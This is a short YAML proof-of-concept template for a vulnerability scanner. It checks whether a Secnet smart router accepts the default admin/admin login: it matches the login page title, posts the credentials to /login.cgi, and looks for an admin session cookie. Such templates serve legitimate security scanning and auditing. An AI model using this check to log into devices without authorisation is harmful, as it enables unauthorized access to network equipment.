detail:
  author: iak3ec(https://github.com/nu0l)
  links:
  - https://bbs.secnet.cn/post/t-30
expression: uc1() && uc2()
manual: true
name: poc-yaml-secnet-ac-default-password
rules:
  uc1:
    expression: "response.status == 200 && response.body.bcontains(b\"<title>\u5B89\
      \u7F51\u79D1\u6280-\u667A\u80FD\u8DEF\u7531\u7CFB\u7EDF</title>\")"
    request:
      cache: true
      method: GET
      path: /login.html
  uc2:
    expression: response.status == 200 && response.headers["Set-Cookie"].contains("ac_userid=admin,ac_passwd=")
      && response.body.bcontains(b"window.open('index.htm?_")
    request:
      body: user=admin&password=admin
      cache: true
      method: POST
      path: /login.cgi
transport: http
